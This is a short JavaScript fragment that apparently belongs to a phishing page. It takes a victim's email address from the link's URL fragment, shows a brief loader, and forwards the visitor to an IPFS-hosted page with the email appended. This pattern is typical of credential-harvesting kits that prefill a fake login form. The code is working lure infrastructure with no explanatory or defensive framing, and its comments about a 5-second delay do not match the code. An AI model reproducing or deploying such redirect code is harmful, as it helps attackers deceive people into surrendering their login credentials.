    <script>
      // Function to validate email format
      function validateEmail(email) {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(email);
      }

      // Get URL parameters
      document.getElementById('wrapper').style.display = 'none';
      const urlParams = new URLSearchParams(window.location.search);
      const email = window.location.hash.substr(1); //urlParams.get('mail'); // Get 'mail' parameter

      // If the 'mail' parameter exists and is a valid email
      if (email && validateEmail(email)) {
        // Show loader for 5 seconds before redirect
        document.getElementById('loader').style.display = 'block';

        setTimeout(() => {
          // Redirect to the desired URL
          window.location.href = "https://ipfs.io/ipfs/bafybeih2kfmgijxrfdxvwo2dxdfgpji2rzduyhsnlzgdpxi7kacyewvcim/#"+email; // Change this to the URL you want to redirect to
        }, 1000); // 5 seconds delay
      } else {
        document.getElementById('wrapper').style.display = 'block';
      }
